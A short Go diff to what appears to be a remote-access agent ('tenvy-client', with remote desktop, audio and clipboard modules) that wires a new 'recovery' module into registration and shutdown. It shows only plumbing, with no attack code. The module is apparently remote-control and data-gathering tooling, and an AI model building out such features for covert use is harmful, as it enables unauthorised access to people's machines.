@@ -17,6 +17,7 @@ import (
 	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
+	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	"github.com/rootbay/tenvy-client/internal/protocol"
 )
 
@@ -193,6 +194,16 @@ func (a *Agent) reRegister(ctx context.Context) error {
 			UserAgent: a.userAgent(),
 		})
 	}
+	if a.recovery != nil {
+		a.recovery.UpdateConfig(recovery.Config{
+			AgentID:   a.id,
+			BaseURL:   a.baseURL,
+			AuthKey:   a.key,
+			Client:    a.client,
+			Logger:    a.logger,
+			UserAgent: a.userAgent(),
+		})
+	}
 
 	a.logger.Printf("re-registered as %s", a.id)
 	a.processCommands(ctx, registration.Commands)
@@ -282,6 +293,9 @@ func (a *Agent) shutdown(ctx context.Context) {
 	}
 	if a.remoteDesktop != nil {
 		a.remoteDesktop.Shutdown()
+	}
+	if a.recovery != nil {
+		a.recovery.Shutdown()
 	}
 	if err := a.sync(ctx, statusOffline); err != nil {
 		a.logger.Printf("failed to send offline heartbeat: %v", err)
